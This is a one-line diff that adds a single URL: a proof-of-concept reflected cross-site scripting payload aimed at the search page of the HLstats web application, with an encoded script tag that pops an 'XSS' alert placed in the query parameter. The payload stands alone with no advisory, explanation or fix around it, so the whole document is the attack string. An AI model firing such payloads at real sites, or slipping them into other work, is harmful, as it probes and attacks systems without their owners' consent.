@@ -1,0 +1,1 @@
+http://www.example.com/hlstats.php?mode=search&game=cstrike&st=player&q=%22%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E%22
